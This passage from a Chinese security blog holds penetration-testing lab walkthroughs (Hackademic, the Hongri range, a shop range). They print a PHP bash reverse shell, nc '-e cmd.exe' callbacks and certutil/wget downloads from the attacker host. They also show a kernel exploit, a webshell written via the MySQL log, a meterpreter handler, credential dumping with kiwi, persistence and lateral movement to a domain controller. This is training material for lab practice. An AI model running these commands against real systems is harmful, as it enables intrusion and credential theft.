<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.128/1234 0&gt;&amp;1&#x27;&quot;); ?&gt; </span><br></pre></td></tr></table></figure>

<p>上传成功且路径是&#x2F;wp-content&#x2F;，下面只要开启nc监听，并访问&#x2F;wp-content&#x2F;shell.php即可接收到反弹shell</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87184.png" class title="This is an test image">    

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87185.png" class title="This is an test image">    

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87186.png" class title="This is an test image">    nc监听成功收到了反弹shell



<p><strong>最后进行内核提权</strong></p>
<p>先用python增强shell的交互性：</p>
<p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p>
<p>查看当前用户，是apache，然后查看内核版本，是2.6.31</p>
<p>用sudo -l查看当前用户权限：需要密码。此路不通</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87187.png" class title="This is an test image">    

<p> 由于22端口的SSH服务没有开放，所以对于提权来说，寻找SSH登录密码是没有意义的，而我们看到的内核版本又比较老旧，因此可采用内核提权的方法。在searchsploit中搜索Linux kernel 2.6.3版本的提权漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux kernel 2.6.3 | grep -i &#x27;Privilege Escalation&#x27; </span><br></pre></td></tr></table></figure>

<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87188.png" class title="This is an test image">    

<p>尝试15258.c，发现可以提权，过程如下，先把漏洞利用文件下载下来</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87189.png" class title="This is an test image">    

<p>然后把他传到靶机的&#x2F;tmp目录下，先在kali中启动一个http服务：</p>
<p>php -S 0:80</p>
<p>然后在靶机&#x2F;tmp目录下wget，把kali中的15285.c下载下来：</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87190.png" class title="This is an test image">    

<p>在靶机中用gcc编译，就直接命名为15285得了</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87191.png" class title="This is an test image">    

<p> 然后直接运行即可提权</p>
<p>进入&#x2F;root目录，查看key.txt</p>
<img data-src="/2023/11/02/Hackdamic%E9%9D%B6%E6%9C%BA/%E5%9B%BE%E7%89%87192.png" class title="This is an test image">    

<p>成功拿到flag</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/" class="post-title-link" itemprop="url">红日靶场</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-26 09:04:58" itemprop="dateCreated datePublished" datetime="2023-10-26T09:04:58+08:00">2023-10-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-11 23:34:44" itemprop="dateModified" datetime="2024-03-11T23:34:44+08:00">2024-03-11</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="红日靶场"><a href="#红日靶场" class="headerlink" title="红日靶场"></a>红日靶场</h3><p><strong>编辑虚拟网络</strong></p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8790.png" class title="This is an test image"> 

<p>kali</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8791.png" class title="This is an test image">  

<p>Win 7</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8792.png" class title="This is an test image">  

<p>Win2K3&#x2F;2008 R2</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8793.png" class title="This is an test image">  

<p>查看本机ip</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8794.png" class title="This is an test image">  

<p>开靶机和未开靶机对比，得知目标主机IP为192.168.229.129</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8795.png" class title="This is an test image">  

<p>启动Win7中的Web服务</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8796.png" class title="This is an test image">  

<p>nmap扫描一下目标主机，发现开放了80, 3306端口</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8797.png" class title="This is an test image">  

<p>对目标进行访问，发现默认页面为phpStudy 探针,泄露大量信息。</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8798.png" class title="This is an test image">  

<p>目录扫描，发现后台登录界面的网址</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%8799.png" class title="This is an test image">  

<p>尝试访问</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87100.png" class title="This is an test image">  

<p> 抓包发现没有进行防爆破，尝试进行爆破</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87101.png" class title="This is an test image">  

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87102.png" class title="This is an test image">  

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87103.png" class title="This is an test image">  

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87104.png" class title="This is an test image">   

<p>账密为root&#x2F;root,进入后台</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87105.png" class title="This is an test image">   

<p>将变量中的general log更改为ON，将general log file的路径更改为当前网站根目录下路径C:\phpStudy\WWW\test.php。（开启 SQL 的通用查询日志功能，并将日志文件保存在该路径）<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87106.png" class title="This is an test image">  </p>
<p>在SQL界面写入一句话木马</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87107.png" class title="This is an test image">   

<p>访问<a target="_blank" rel="noopener" href="http://192.168.229.129/test.php?test=phpinfo();%E9%AA%8C%E8%AF%81%E6%88%90%E5%8A%9F%E6%8F%92%E5%85%A5">http://192.168.229.129/test.php?test=phpinfo();验证成功插入</a></p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87108.png" class title="This is an test image">  

<p>将nc和wget.exe放入&#x2F;var&#x2F;www&#x2F;html目录下，然后启动Apache服务。</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87109.png" class title="This is an test image">  

<p>查看服务的状态</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87110.png" class title="This is an test image">  

<p>服务已正常启动，访问127.0.0.1看到默认页面</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87111.png" class title="This is an test image">    

<p>WEBSHELL中执行，完整命令为<a target="_blank" rel="noopener" href="http://192.168.229.129/test.php?test=system">http://192.168.229.129/test.php?test=system</a>(“certutil -urlcache -split -f <a target="_blank" rel="noopener" href="http://192.168.229.128/wget.exe">http://192.168.229.128/wget.exe</a> C:\phpStudy\WWW\wget.exe”);</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87112.png" class title="This is an test image">   

<p>通过Windows下的dir命令查看,<a target="_blank" rel="noopener" href="http://192.168.229.129/test.php?test=system(%22dir%22)">http://192.168.229.129/test.php?test=system(&quot;dir&quot;)</a>;</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87113.png" class title="This is an test image">   

<p>之后使用wget将整个nc的文件夹下载下来。WEBSHELL中执行wget -r -np -nH –cut-dirs&#x3D;1 <a target="_blank" rel="noopener" href="http://192.168.100.128/nc/">http://192.168.100.128/nc/</a></p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87114.png" class title="This is an test image">   

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87115.png" class title="This is an test image">   

<p>之后在kali上进行监听，再让Win7连接kali。靶机的WEBSHELL中执行nc 192.168.229.128 8888 -e cmd.exe</p>
<p><a target="_blank" rel="noopener" href="http://192.168.229.129/test.php?test=system">http://192.168.229.129/test.php?test=system</a>(“nc 192.168.229.128 8888 -e cmd.exe”);</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87116.png" class title="This is an test image">   

<p>攻击机执行nc -vlp 8888</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87117.png" class title="This is an test image">   



<p><strong>权限维持与内网信息收集</strong></p>
<p>首先修改cmd的字符编码为utf-8（chcp 65001），以此来避免乱码问题</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87118.png" class title="This is an test image">   

<p><strong>获取系统信息</strong></p>
<p>有用信息：1. 主机加了一个域god.org</p>
<p>​                   2. 此主机的网络配置，内网网段包含192.168.52.143</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87119.png" class title="This is an test image">   

<p>Whoami得知我们现在的用户为administrator，属于god域</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87120.png" class title="This is an test image">   

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87121.png" class title="This is an test image">   

<p><strong>关闭windows防火墙</strong></p>
<p>（”netsh” 是一个用于配置和监控各种网络设置的命令行工具。”advfirewall” 是 Windows Firewall（也称为Windows防火墙）的管理组件。”set currentprofile” 表示该命令将应用于当前活动的配置文件，即当前正在使用的防火墙配置文件。”state off” 意味着将关闭当前活动的防火墙配置文件。）</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87122.png" class title="This is an test image">   



<p><strong>修改注册表以允许远程桌面连接</strong></p>
<p>HKEY_LOCAL_MACHINE” 分支下的 “SYSTEM\CurrentControlSet\Control\Terminal Server:修改的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/v fDenyTSConnections：修改的键值名称 fDenyTSConnections 是表示是否允许远程桌面连接的</span><br><span class="line">/t REG_DWORD：设定数据类型</span><br><span class="line">/d 0：设置数据</span><br><span class="line">/f：强制操作</span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87123.png" class title="This is an test image">   

<p>启动远程桌面服务</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87124.png" class title="This is an test image">   

<p>进行远程桌面连接</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87125.png" class title="This is an test image">   

<p>创建一个msf的木马，将这个木马移动到&#x2F;var&#x2F;www&#x2F;html文件夹下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-p    指定payload</span><br><span class="line">LHOST  攻击机IP</span><br><span class="line">LPORT  监听端口</span><br><span class="line">-f    确定输出格式</span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87126.png" class title="This is an test image">   

<p>让目标下载这个木马</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87127.png" class title="This is an test image">  

<p> 进入msf框架的命令行</p>
<p>use exploit&#x2F;multi&#x2F;handler使用“多模块”漏洞利用程序</p>
<p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp设置要使用的负载类型，指定了Windows 64位操作系统上的Meterpreter负载</p>
<p>set lhost设置攻击机器的IP地址</p>
<p>set lport设置监听端口号</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87128.png" class title="This is an test image">  

<p>运行木马</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87129.png" class title="This is an test image">  

<p>成功返回结果</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87130.png" class title="This is an test image">  

<p>getsystem进一步提权，getuid查看提权结果</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87131.png" class title="This is an test image">  

<p>导入kiwi模块，获取到系统中的用户名和密码</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87132.png" class title="This is an test image">  

<p>creds_all获取目标系统上存储的凭据信息</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87133.png" class title="This is an test image">  

<p> 设置一个定时任务，以免连接被断开。（taskschd.msc打开任务计划程序）</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87134.png" class title="This is an test image">  

<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87135.png" class title="This is an test image">  

<p> 创建完成，重启win7进行验证</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87136.png" class title="This is an test image">  

<p>在攻击机上监听</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87137.png" class title="This is an test image">  

<p><strong>下面是内网信息收集</strong></p>
<p>查看当前计算机&#x2F;域基本信息（net config workstation）</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87138.png" class title="This is an test image">  

<p>已经知道了当前主机在GOD域中</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87139.png" class title="This is an test image">  

<p>可知域控主机名为OWA</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87140.png" class title="This is an test image">  

<p> 查询域用户</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87141.png" class title="This is an test image">  

<p>查看域的密码策略</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87142.png" class title="This is an test image">  

<p>获取域管理员列表</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87143.png" class title="This is an test image">  

<p>扫描当前内网网段，扫描出了138&#x2F;141两个IP（143前面已经知道是跳板机IP）</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87144.png" class title="This is an test image">  

<p>ping一下OWA查看域控的IP</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87145.png" class title="This is an test image">  

<p>至此内网的基本信息收集结束</p>
<p><strong>横向移动</strong></p>
<p>对域控进行扫描</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87146.png" class title="This is an test image">  

<p>通过上面的信息收集，我们发现我们当前的账号在域中有登记，并不只是本地账户，因此我们可以尝试与域控直接进行IPC连接。</p>
<p>发现同时开启了139&#x2F;445端口，有可能可以进行IPC连接。</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87147.png" class title="This is an test image">   

<p>net use \目标IP\ipc$ “密码” &#x2F;user:”账户”，它的作用是使用 IPC（Inter-Process Communication，进程间通信）连接到目标 IP 地址上的 ipc$ 共享资源。</p>
<p>net use 命令可以将本地系统的某个共享资源映射到远程系统上，并进行访问。</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87148.png" class title="This is an test image">  

<p>尝试操控目标主机</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87149.png" class title="This is an test image">  

<p>尝试让目标主机运行nc</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87150.png" class title="This is an test image">  

<p>查看目标当前的时间</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87151.png" class title="This is an test image">  

<p>使用at命令为目标创建一个计划任务，让其在指定的时间运行命令</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87152.png" class title="This is an test image">  

<p>Win7上开启监听，到时间后成功回弹</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87153.png" class title="This is an test image">  

<p> 之后尝试将shell反弹回攻击机上</p>
<p>在Win7上创建一个端口转发</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">listenaddress：监听地址</span><br><span class="line">listenport：监听端口</span><br><span class="line">connectaddress：连接地址</span><br><span class="line">connectport：连接端口</span><br></pre></td></tr></table></figure>

<p>netsh interface portproxy show v4tov4：显示当前系统中的转发规则</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87154.png" class title="This is an test image">  

<p>之后让域控连接Win7的9999端口</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87155.png" class title="This is an test image">  

<p>在攻击机上开启端口9999的监听，在攻击机上成功获取域控的shell</p>
<img data-src="/2023/10/26/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/%E5%9B%BE%E7%89%87156.png" class title="This is an test image">  

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://acindm.github.io/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png.jpg">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="Welcome to the 1/30000 🫧">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="acind の blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" class="post-title-link" itemprop="url">shop靶场&封神台</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-20 21:30:05" itemprop="dateCreated datePublished" datetime="2023-10-20T21:30:05+08:00">2023-10-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-12 09:09:40" itemprop="dateModified" datetime="2024-03-12T09:09:40+08:00">2024-03-12</time>
              </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.7k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="shop靶场-1"><a href="#shop靶场-1" class="headerlink" title="shop靶场-1"></a><strong>shop靶场-1</strong></h3><p><em>ps：借鉴了一部分其他小伙伴的渗透过程内容(csdn@哈哈哈cry)</em></p>
<p>进入windows 7 x64虚拟机里钓鱼台网站的后台</p>
<p>打开虚拟机后然后双击打开shop1:</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8737.png" class title="This is an test image">

<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8738.png" class title="This is an test image">

<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8739.png" class title="This is an test image">

<p>如果遇到双击打不开的情况，点击右下角的小三角形，找到绿色的KR，点击：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8740.png" class title="This is an test image">

<p>点击关闭:</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8741.png" class title="This is an test image">

<p>现在再点击就能打开了，如图：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8742.png" class title="This is an test image">

<p>点击第一行：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8743.png" class title="This is an test image">

<p>输入网站后台的地址：<a target="_blank" rel="noopener" href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop/admin/login.asp </a>我们来到后台登录页面（这里找到后台比较简单，可以试一下几个可能的地址，就不需要扫描了）</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8744.png" class title="This is an test image">

<p>先来试试弱密码：账号：admin 密码：admin</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8745.png" class title="This is an test image">

<p>填好后点击“管理登录”，发现成功进入后台管理页面：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8746.png" class title="This is an test image">





<h3 id="shop靶场-2"><a href="#shop靶场-2" class="headerlink" title="shop靶场-2"></a>shop靶场-2</h3><p>打开过程同“shop靶场-1”</p>
<p>首先进入后台先要找到后台登录页面，使用工具扫描没有结果，但发现了网站的后台：</p>
<p><a target="_blank" rel="noopener" href="http://192.168.111.134/shop2/admin/login1.asp">http://192.168.111.134/shop2/admin/login1.asp</a></p>
<p>跳转到网页后台登录页面：</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8747.png" class title="This is an test image">

<p>试一试之前试过的弱密码，失败</p>
<p>接下来进行<strong>sql注入</strong></p>
<p>打开阿D注入工具</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8748.png" class title="This is an test image">

<p>将注入链接里面的IP地址改成我现在的地址，点击检测</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8749.png" class title="This is an test image">

<p>点击检测标段，再点击admin</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8750.png" class title="This is an test image">

<p>点击检测字段，再把password和admin勾选上</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8751.png" class title="This is an test image">

<p>点击检测内容</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8752.png" class title="This is an test image">

<p>结果出现两组账号密码，我们任选其中一组就行</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8753.png" class title="This is an test image">

<p>在这里，我选择了上面一种，双击，出现账号和密码</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8754.png" class title="This is an test image">

<p>我们发现密码好像被MD5加密过了，解密得</p>
<img data-src="/2023/10/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/%E5%9B%BE%E7%89%8755.png" class title="This is an test image">

<p>用获取的账号和密码进行登录</p>
